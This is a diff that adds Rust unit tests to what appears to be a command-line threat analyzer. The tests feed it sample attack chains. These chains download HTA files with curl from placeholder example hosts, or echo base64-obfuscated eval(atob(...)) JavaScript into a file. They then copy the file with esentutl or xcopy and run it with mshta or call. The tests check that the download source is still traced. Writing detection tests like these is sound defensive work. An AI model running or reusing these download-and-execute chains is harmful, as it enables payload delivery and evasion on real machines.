@@ -8870,6 +8870,51 @@ mod esentutl_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn esentutl_preserves_download_source_for_later_execution() {
+        let report = analyze(
+            br#"curl -o original.hta https://esentutl-copy-download.example/payload.hta
+esentutl /y original.hta /d C:\Temp\renamed.hta /o
+mshta C:\Temp\renamed.hta"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\renamed.hta"
+                            && url == "https://esentutl-copy-download.example/payload.hta"
+                )
+            }),
+            "esentutl copied downloaded HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn esentutl_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXNlbnR1dGwtY29weS1qcy5leGFtcGxlL3BheWxvYWQn")) > original.js
+esentutl /y original.js /d C:\Temp\renamed.js /o
+call C:\Temp\renamed.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://esentutl-copy-js.example/payload"
+                )
+            }),
+            "esentutl copied generated JS was not scanned on later execution: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -13156,6 +13201,51 @@ mshta renamed.hta"#,
                 )
             }),
             "xcopy.exe pipeline copied download was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn xcopy_directory_destination_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o original.hta https://xcopy-dir-download.example/payload.hta
+xcopy /y /i original.hta C:\Temp\
+mshta C:\Temp\original.hta"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\original.hta"
+                            && url == "https://xcopy-dir-download.example/payload.hta"
+                )
+            }),
+            "xcopy directory destination was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn xcopy_directory_destination_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veGNvcHktZGlyLWpzLmV4YW1wbGUvcGF5bG9hZCc=")) > original.js
+xcopy /y /i original.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://xcopy-dir-js.example/payload"
+                )
+            }),
+            "xcopy directory destination did not preserve generated JS content: {:?}",
             report.traits
         );
     }
